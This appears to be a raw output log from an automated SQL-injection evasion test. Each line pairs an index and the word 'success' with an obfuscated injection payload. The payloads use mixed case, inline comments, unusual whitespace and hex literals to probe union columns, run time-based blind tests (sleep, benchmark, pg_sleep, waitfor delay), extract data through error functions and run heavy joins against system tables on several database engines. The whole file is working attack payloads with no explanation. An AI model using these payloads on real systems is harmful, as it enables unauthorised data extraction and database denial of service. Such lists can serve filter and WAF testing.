+870 success 'sELECt count  (/**/ *  )   fRom\x0csysibm.systables aS t1,sysibm.systables aS\x0ct2,sysibm.systables AS t3 and   (  "lsvg" LIkE "lsvg '
+876 success '1"   )    )    AS xcyo WHErE 7080 NOT LIKE 7081 '
+878 success '1" rlike sleep/**/ (  0x5  )  /**/and/**/"rylv"\x0blike "rylv '
+880 success "-0x260b' Or\xa08571\x0b/**/=/**/ 8571 oR 0x0-- g"
+883 success "1  )   aS tbve WHere 6275<>6276 AnD 1 or '1{V'='1{V`' "
+884 success "1' In boolean mode  )  /*N+*/aND (SelEcT 0x954)   lIKE   benchmark\xa0 (  5000000,md5/**//**/(  0x6d457153   )/**/\x0b  )   # C"
+885 success "iif  (  5257  =  5257 AND 'AU7' NOT LIKE 'AU7P' AND True,1,1/0  )   "
+886 success "-6155%'   ) \xa0/**/ )    union/**/all select 2421,2421,2421,2421,2421# "
+887 success 'call regexp_substring  (  repeat  (  LeFT  (  crypt_key  (  char  (  65  )   OR char  (  69  )   OR char  (  83  )  ,null  )  ,0  )  ,500000000  )\x0c ,null  )  #/*k*/,N'
+888 success 'sELEct   (  case wheN   (  8978   lIKE   1426  )   tHEn 1 ELse 8978*  (  sElECt 8978\xa0fRoM master..sysdatabases  )   enD  )  -- '
+889 success '(Select 1)   )    )    aS gxvp wHeRe 5678<>5679 '
+890 success '-7395%"/*z7*/order by 1-- '
+891 success " (  seLecT * FROM   (  SElEcT  (  sleep  (  0x5   )    ) \x0c   )  srmq  )   AnD 'fdgq'   likE   'fdgq "
+892 success "-1236'+/**/ (  select 'fbgh' wHeRe 7002\xa0LIkE 7002 union all SelEcT 3896,3896,3896,3896,3896,0xf38,3896,3896,3896-- b3O"
+895 success "-8521'+  (  SElECt ucim WHerE 9003  =  9003 or 0/**/aND 7898 iN (7897,7898,7899) union all seLECt 9003-- "
+896 success '-2013"   )  \x0c )    As kisy wHEre 3802  =  0xeda ANd True oR 5903  =    (  \'qqpjq\'||  ( \xa0seLEct cASe 0x170f WhEN 0x170f thEn/**/1 eLSe 0x0 enD fROm rdb$database  )  ||\'qzvzq\'  )  -- ,'
+897 success ' SEleCt * FrOM users wHeRe id   liKe   0x1 +\\. union/**/SelEcT null,@@VERSION -- (SELECT 1) yC'
+900 success '-9265"  )    OR  7834   LikE   1685 '
+901 success "1'+  ( /**/select 'xqjx' wheRE 'bN' LIKE 'bN' And 9070=9070-- "
+902 success '-9859" /**/ )    )   \n )  /**/union all sEleCT 6595,6595,6595,6595,6595,6595,6595# Q'
+903 success 'SElEct   (  CASE WHeN   ( \x0b3537   like   5218  )   ThEN 3537 ElSe 0xdd1*  (  seLeCt 3537 fRom mysql.db  )   END /**/)  # '
+905 success "-0x1f5c%'   )/**/   )     )  \x0cOR 0x13b2   LIKE \x0b (SELECT (SELECT 5214)) "
+906 success '-0x1608"   ) \xa0  )\n   or/**/(SELECT 9792)   LIKE   2728-- mg'
+909 success "0x1'   )    )    aS babx WHERE 0x9be   lIkE   0x9be  OR  (SELECT 1022)   LIKE  /**/  (  SELECt count  ( /**/*  )   fROm\xa0all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )\n --  +"
+910 success "0x1'   )\xa0   )    as iuta WHErE 1482   lIkE   1482 "
+911 success '/**/ (  seLEcT count  (  * \n)   FROm sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables aS t3  )   '
+913 success 'Or 1 IN   ( \xa0SelEct @@version  )\x0c -- '
+914 success 'sElEct cAse whEn/**/7634 /*ga*/ lIKe   3954 theN 0x1\telSE null ENd-- X'
+915 success '(SELECT 0x1)  )   aNd extractvalue  (  (SELECT (SELECT 0x1f2e)),concat \xa0(  0x5c,0x7171706a71,  (  SelECt   (  elt  (  0x1f2e   LIKE   (selEcT 0x1f2e),0x1   )\t   )     )  ,0x717a767a71   )    )    '
+917 success ' sELect * froM users whERE id   Like/**/  0x1.<1# union select/**/1,version/**/ (    )  /**/-- 1 B'
+918 success '  (  sELECT * From   (  seleCt  (  sleep  (  (SEleCt (selEcT (SELecT 5)))   )    )     )/*U* */ srmq  )   aNd    (    (     (  "sxih"   lIKe   "sxih '
+921 success '0x1  )   whEre 0x1b72  = /**/7026 '
+923 success 'SeLeCt count  (  *  )   FROM rdb$fields as t1,rdb$types AS t2,rdb$collations aS/**/t3,rdb$functions As\nt4 &&   (  1180 IN (1179,1180,(seleCT 1181)) '
+925 success '(seLEct 0x1)   )    )    And sleep  (\x0b 0x5  )   And    (    (   0x237c   LikE   0x237c '
+926 success '0x1   ) \x0c  )    As sfan wHeRE 0x1c08   like   7176 aND 0x1b69  =  7358 '
+930 success '1/*)(aV*/ )   as/**/ewnv whEre 3393   LikE/**/  3393 aND 2716   LikE     (  selECt count  (  *  )   fROm sysusers as sys1,sysusers As sys2,sysusers as sys3,sysusers As sys4,sysusers aS sys5,sysusers AS sys6,sysusers As sys7  )  -- '
+932 success '1 wHeRe\x0c2382  \x0bLiKE   2382 '
+938 success '0x1  )\t  whERE 0x5cf/*7r\n*/ =  0x5cf '
+939 success '1"   )    )    aS sgln WhERe/**/7573 \n=\x0c 7573 OR False/**/'
+942 success "SELECT count  (  *  )   fROM generate_series  (  0x1,5000000  )   aND 'roca'  =  'roca "
+944 success "-9358' or 9887 \n LIKE /*6*/\n2569-- "
+946 success "-0x178e%' \t)   Or 0xbde/**/ =  3038 "
+947 success '1" /**/)   as dgzf wheRE (SELECT 4834)  =  4834\x0b'
+948 success "1' AnD\x0c(selEct (sElEcT/**/9198)) /*L?88<*/ LIKE   9198-- l5,"
+949 success '-6076"   )    ) \t  oR 8277   like \n 4757 '
+951 success "0x1'+  (  select 'drvv' whERE ' n' NOT LIKE ' nh' aNd 3580   LiKE     (  sElECt\ncount/**/ (  *  )   froM domain.domains As t1,domain.columns AS t2,domain.tables AS t3  )  -- "
+952 success 'seLecT\x0ccount  (/*sCe%(*/ *  )   FroM domain.domains As t1,domain.columns AS t2,domain.tables As t3 && "%" /**/=  " '
+953 success "waitfor delay '0:0:0x5' "
+956 success '1" wheRE/**/2259<>2260 '
+959 success '-8868"  )   WHerE 5681   LIKE   5681 OR False union all sElECt 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- '
+960 success "hi' or/**/1  =  1 OR 'bT' LIKE 'bTn' --/**/"
+961 success "1' /**/ )    )   /*}LN(-*/AS bwjl WhERE 9525 LIKE 0x2535 union all sEleCt null,null,null,null,null,null,null# "
+962 success '0x1   )    )     )   OR (seLeCT 0x14a6)   lIkE     (  SeleCt count  (  *  )   frOm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5/**/ )   And    (  \x0b (     (  0x227 iN (550,(SeLecT 551),552) or \'"\r\' liKe \'"\r:\' '
+963 success "1'  )   as ibaw where/**/'~a' NOT LIKE '~a9' and\x0c9198   LIKE   9198 AND True OR 0--/**/"
+964 success "0x1'+  (  SeLeCt rdwb wHERE 3196<>3197 aND 3429  =  7639-- "
+966 success "a' --/**/"
+967 success "0x1'+  (  select 'vtyw' where 0x1f0e/**/ =  0x1f0e order\tby/*w*/0x1-- \xa0ft"
+969 success '0x1"  )   As xwnu whERE 7676/**/LikE 0x1dfc union all SEleCt\x0bnull,null,null,null,null,null-- C^'
+970 success 'selECt   (  cAsE WHEn   (  6166   lIkE   0xd24 \x0c)   Then 6166 elSe cast  (  1 AS int  )  /  (\x0b sELEct 0 FROM dual  )/**/  eNd  )   FROm dual-- tUrE'
+971 success "-5130'/**/  )    ) /**/ \x0cunion/**/all select\xa05218,5218,5218,5218,5218,(SELECT 5218),5218,5218,(SELECT 5218),5218-- "
+974 success "-0x1d4d'+  (  SelECt uloc WherE 3089/**/  Like   3089 AND 1 union all SelEct 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- ey"
+975 success 'seLEct   ( /**/cAsE wHEN   (  8331  =  5625 \x0b) \x0c Then 8331 Else 8331*  (  SeLeCt 8331 fROM mysql.db  )   END  )  # '
+976 success "1'  )\t  as dpmh where '_Ao'!='_Ao{' ANd 4777 NOT LIKE 4778 Or/**/0xce1<>3297 "
+977 success '0x1/**/and sleep  (  (SelECT 5)  )  # '
+979 success 'select pg_sleep/**/ (  5  )   && "zhsc"   like   "zhsc/*Q*/'
+980 success 'sElEct benchmark  (  5000000,md5  (  0x4c4d6142\n  )/**/   )   # idxq\txu'
+983 success '-9864"  )   or/**/elt  (  5885  =  4936,4936\x0b )/**/  and   (  "bfbb" like "bfbb '
+987 success '1" union/**/all\nseLeCt null,null,null,null,null,null,null,null,null,null# '
+988 success 'SeLECT\t  (  CASe whEN   (  9030   LIke   0x23e1  )   tHen 9030\tELsE\n9030*  (  SELeCt 0x2346 FrOm information_schema.character_sets  ) /**/ End  )  # '
+990 success "1'+  (  SElEcT dklj wHeRe 3265  =  3265\n"
+991 success "0x1'   )/**/   )/*_9*/    ) /**/ union all SElect\x0cnull,null,null,null,null,null,null# "
+992 success "-0xb35'   ) \n  ) \x0b /**/union all seLecT 0xc90-- "
+993 success "1'  ) /**//**/where 'jSE'='jSE' "
+995 success "1'  )/*\n\r*/  WheRE 0x45b   LIKE  \t1115 "
+1000 success '1 wheRe 8398   LIke  \x0c(SElEct (SeLect 0x20ce))/**/'
+1002 success "-(sELECT 3107)'  )   WhErE 7782  =  7782 Or 8571   like   8571 oR 0/**/Or 0-- Y"
+1003 success '0x1" /*m*/ )  /**/ )    as jrld where \'P\' NOT LIKE \'P}\' '
+1005 success "eND aND    (    ( \xa0   (  'xzbk'   LIKE   'xzbk "
+1006 success '1"  )  /**/where \'u\' NOT LIKE \'uy\' '
+1009 success '"  )   OR benchmark  ( /**/(SeleCT 10000000),MD5  (  1/**/ /**/) /**/  )   # '
+1011 success '-3321" wherE 6466 NOT LIKE 6467 And \'0u\'!=\'0uf\' union all/**/SeleCt 1603,(SELECt 1603),1603,1603# '
+1012 success 'iF  (  0x2323   LiKe   (SELECT 9787)  )   SeleCt (Select 8995) ELse droP function ofgg-- '
+1015 success '1  )   whEre 2679 \x0c\x0clIKe  /***/(selEct 2679) Or 4915  =\x0b\xa0  (  SElecT count  (  *  )   From/**/domain.domains AS t1,domain.columns AS t2,domain.tables aS t3  ) /**/-- '
+1017 success '-9037%"/**/union all SeLeCt/**/6583# '
+1018 success "-(SELECT 0x669)'\xa0union all select/**/4835#/**/"
+1019 success "-9429'  )\xa0  order by\n0x1-- "
+1024 success "SeleCT count  (  *  )   From sysibm.systables As t1,sysibm.systables as t2,sysibm.systables AS t3 ANd    (    (   'ootz'/**/liKe 'ootz "
+1028 success 'seLECt/**/  (  case When   (  9246  =  6326  )   Then 0x241e elsE 9246*  (  sElEcT 9246 FRom mysql.db  )   EnD  )  # U^'
+1029 success ' (  SelEct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selECt   (  CASE wHeN   (  5703 in (5702,5703,5704)/**/aND 765 NOT LIKE 766 AND 5053 NOT LIKE 5054 oR 4022<>4022 aNd (SELeCt 5275)=0x149b  ) /*Dwv*/ thEn char  (  49  )   else char  (  48  )   End   )    )   +char  (  113  )  +char  (  (SeLEct 122)  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )  '
+1030 success "1'  )   WhERe 7753 In (7752,7753,7754) oR 8421\t  lIKE     (  sELect count  (  *  )   froM generate_series  (  1,0x4c4b40   )    ) /**/ -- UY\\"
+1031 success "sELeCT pg_sleep  (  5\x0b )   AnD/*^F*/'%'  =  ' "
+1033 success "seLeCT count  (  *  )   FroM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables aS t3  )  +' "
+1035 success '(sELeCT 1)\'   )    ) /*U"B7*/  AS jtmf\tWHeRe 7295 not like 7296 oR 9467=9468 '
+1036 success "-4811'   ) \x0c  )    /**/)/**/  union all SeleCt 4603,4603,4603,4603,4603,4603,4603,4603,4603-- "
+1038 success "1'\n )   && 2006  =  2006/**/"
+1039 success "SELeCT count  ( /**/*  )   fRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +' "
+1041 success 'sELEct   ( /**/CasE WHen   (  4780  =  4432  )   THen 4780 eLsE 4780*  (  SeleCT 4780 frOm mysql.db  )   END  )  # '
+1043 success "(SELECT 1)' rlike sleep  (/**/ 0x5  )  "
+1044 success 'SeLEct\n  (  CaSE When   (  7822   LiKE   4430  )   THen 7822 ELSe (SeLECt 1)/  (  SEleCt 0  )   End/**/ )  -- '
+1047 success '1  )  /**/where 1249<>1250 '
+1048 success 'seLect count  (  *  )   FrOM rdb$fields aS t1,rdb$types as t2,rdb$collations aS t3,rdb$functions aS t4 aND    (    (   9117 like 9117 '
+1049 success "  ) /**/ Or sleep  (  __TIME__  )     LIKE   ' "
+1050 success '-1203"   )    )    or 0x217b   LIKE   8571 AND True-- oB'
+1051 success '-0x253f" order/**/by\xa01-- '
+1053 success " SeleCT * From users WherE id   likE   '1' union Select \\.#,@@VERSION -- 1' "
+1054 success "0x1'  )   As noqp wheRe 4042   LikE   4042 Or 8315  =    (  SeLeCT count  (  *  )   FrOm sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables AS t3  )  -- "
+1056 success 'sELECT cAse wHen 0x2023   lIke   1229 ThEn (seLEcT 1) eLSe\tnull eNd-- {'
+1057 success '1%"   )   /*$5Udn*/)   \t )   union/**/all SelEct null,null,null,null,null,null,null# oE'
+1058 success '1"  )  /*R*/where 4951   LIKE   4951 '
+1059 success "1'  )  /**/wheRE 7640   LIke   7640 anD (sElecT 1) Or 0 And make_set  (  0x2312   LIke \n 8594,(sELEct 8594)\xa0 )  -- "
+1060 success "\xa0selECT * fROm users\x0cwHere id\x0c =  '1'  or  ||/3258 NOT LIKE 3259 AND 'o$N' LIKE 'o$N' AnD True OR 0 aND 1 union seLeCT 1,version  (    )  /**/-- 1' T1<"
+1063 success 'SElECT * FROM users WheRe id  =  1 <@. OR 9939 like 9939 -- 1 RTNf'
+1066 success "1' /**/ )/**/   )/**/   union all\x0bSElect/**/null,null,null,null,null-- gK"
+1067 success '-5322"\xa0union/**/all seLEct\xa0(SELECT 6494),6494,6494,(seLecT 6494),6494,(SELECT 6494)-- bI'
+1068 success '1" where 0x20c3/*&|(SELECT 0)*/  LIKE   0x20c3 '
+1069 success "-(selECt/**/5147) OR   (  'lek' NOT LIKE 'lekZ'/**/ )  *4906 "
+1070 success '-3707"   )    )     )  \x0coR 0x217b   like  /**/8571-- '
+1072 success '1"  )   WHERE \']qY\' LIKE \']qY\' '
+1073 success "-(SELECT 1587)'  )   oR 8339\x0c =  0x15a4 "
+1074 success "1'  )   AS bzem wherE\n4240  = /**/4240 And True "
+1078 success '1 /**/)  /*<*/whERe 0x12ac  =  4780/**/'
+1080 success " or\n'1'\t/*,&W*/ =   '1/**/"
+1081 success "-(SElEct 4032)'  )   wHerE/**/2876<>2877 AND True oR 1809   lIKE   2810# ="
+1084 success "1%'  )/*Cd>I*/ \x0cunion all\xa0SEleCT/**/null,null,null,null--/**/"
+1091 success "1'+  (\n select\t'dhcv' wHerE 9372  =  9372 "
+1092 success '1" aND   (  SELECT\t* fROM   (  SELect  (  sleep  (  (SELECT 5)   )    )    /**/)/*T^cQn*/ gcrr /**/)  # Z'
+1093 success '(sELECt (SELecT\x0b1))%"   )\t  /*L`Nu*/)  \x0b/**/order by 1# '
+1096 success '-(SelecT 0x1138)"  )   or\n6872/*]W"4*/ =  6872/**/and   (  "oenu"  =  "oenu '
+1097 success "call regexp_substring  ( /**/repeat  (  right  (  char  (  3702  )  ,0  )  ,0x1dcd6500  )  ,null  )   &&    (    (/**/ \n  (  'gsup'   LIKE   'gsup "
+1100 success "-6733'  )   wheRe 4024\x0c  like  \t4024/*-/b[{*/anD 2925<>2926 union all/**/SeLEcT 4024,4024,4024,4024# "
+1101 success '-7466 wHeRe 5161  =  0x1429 or 0xbde/**/  LIke  /**/3038 '
+1102 success '1" AND elt  (  \'d\n\x0b\'/**/lIKE \'d\n\x0b\',sleep  (  0x5   )    )    '
+1104 success "-0x184a'   )    )    oR (SELECT 2236)  = /**/0x1175#/*bW\x0bXn*/9t"
+1110 success 'SEleCT   (  CASE WhEn   (  0x1bfb  \nliKe   0x6f1  )  /**/ThEn 1 eLse 7163*  (\n SELect 7163 FRoM master..sysdatabases  )   enD  )  -- b'
+1115 success "1 /**/)   Where '\x0b-' LIKE '\n-' OR 7066 LIKE 7067 union all sEleCT null,null,null,null,null,null,null# "
+1117 success '-5963" Or \'2\'!=\'22\'# '
+1123 success "-1602' or/**/'RZw' LIKE 'RZw' OR False "
+1124 success 'select/**/case when 2930   LIKE   7964 then 1 else null end-- Od'
+1125 success '0x1 ANd (SelECT 0x15b4)  = /**/ \x0b(  sELecT count  (  *  )  /*C*/fRoM all_users\nt1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj M9.'
+1126 success 'select   (  case WHen   (  5740   LIke   0x1dd4  )   THen/*\r*/5740 elsE cast  (\x0b 1 AS int  )  /  (  SeLect 0 FROM dual  )/**/  END  )   FRom dual-- HMo'
+1127 success "(sElecT 1)%'  )  /**/union all seleCt null,null,null,null,null,null,null,null,null# "
+1129 success "-9657'  )   AS ziiq wHeRe 0x1e2d  =  7725 oR 3038  =  3038 OR 0 "
+1133 success '1"  )   wHeRe \'4\t`L\'<>\'0x4\t`Le\' '
+1134 success "-(SEleCt/**/2190)'\xa0 )/**/  wHerE 8890   Like   (SeLeCt 8890) union all selEct 0x22ba,8890# r"
+1135 success "-8933  )   as iiyr where 955 IN (954,955,956)  OR  '!sQ' NOT LIKE '!sQ'/**/union all select (SELECT 1974),1974,1974,1974,1974# ^_"
+1137 success "select count  (  *  ) /**/ from all_users t1,all_users/**/t2,all_users t3,all_users t4,all_users t5 AND   (  'wweo'   LIKE  /**/'wweo\xa0"
+1138 success '1  ) \xa0 OR updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  SELeCT  /**/(  elt  (  93<>0x5e AND True,0x1   )    )     )  ,0x717a767a71  )  ,8666  )   '
+1139 success "1' WHerE 4245   like   4245\nunion all sElecT/**/null,null-- "
+1140 success ' EnD anD    ( /*CrBc*/  (  \x0b"%"   like /**/ " '
+1141 success "1'/**/ )   as nftr where 'D#J' NOT LIKE 'D#J\\' Or   (  SEleCt * fROm   (  sELEct  ( \nsleep  (  5   )    )     )  sddo  )  # "
+1142 success '-3672"   )    )   /**/union all SELEct (SELECT 6093)# @&'
+1143 success 'iif  (  1217   LIKE   8831,1,1/0  )  \x0b'
+1144 success ' seLeCT * fRom users WheRE id  = /**/1 oR "?  (  " Or \'{\' NOT LIKE \'{1\' -- 1 '
